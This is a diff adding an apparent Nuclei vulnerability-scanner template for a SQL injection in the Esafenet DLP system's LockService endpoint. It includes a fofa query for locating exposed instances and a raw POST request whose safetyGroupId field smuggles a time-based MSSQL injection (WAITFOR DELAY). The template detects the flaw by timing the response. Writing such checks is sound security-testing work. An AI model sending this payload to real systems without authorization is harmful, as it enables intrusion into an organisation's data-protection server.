@@ -1,0 +1,32 @@
+id: esafenet-dlp-LockService-sqli
+
+info:
+  name: 亿赛通数据泄露防护(DLP)系统 LockService SQL 注入
+  author: xx
+  severity: high
+  description: 亿赛通数据泄露防护(DLP)系统 LockService SQL 注入
+  metadata:
+    fofa-query: app="亿赛通-DLP"
+  tags: 亿赛通数据泄露防护(DLP)系统,亿赛通-电子文档安全管理系统
+
+http:
+  - raw:
+      - |-
+        @timeout: 30s
+        POST /CDGServer3/lock/LockService;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 98
+
+        command=AddLockToSafetyGroup&safetyGroupId=11111';WAITFOR+DELAY+'0:0:3'--&fromurl=/client/clientList.jsp&lockKeyId=1
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=3 && duration<8"
+        condition: and
+      - type: status
+        status:
+          - 200
+          - 302
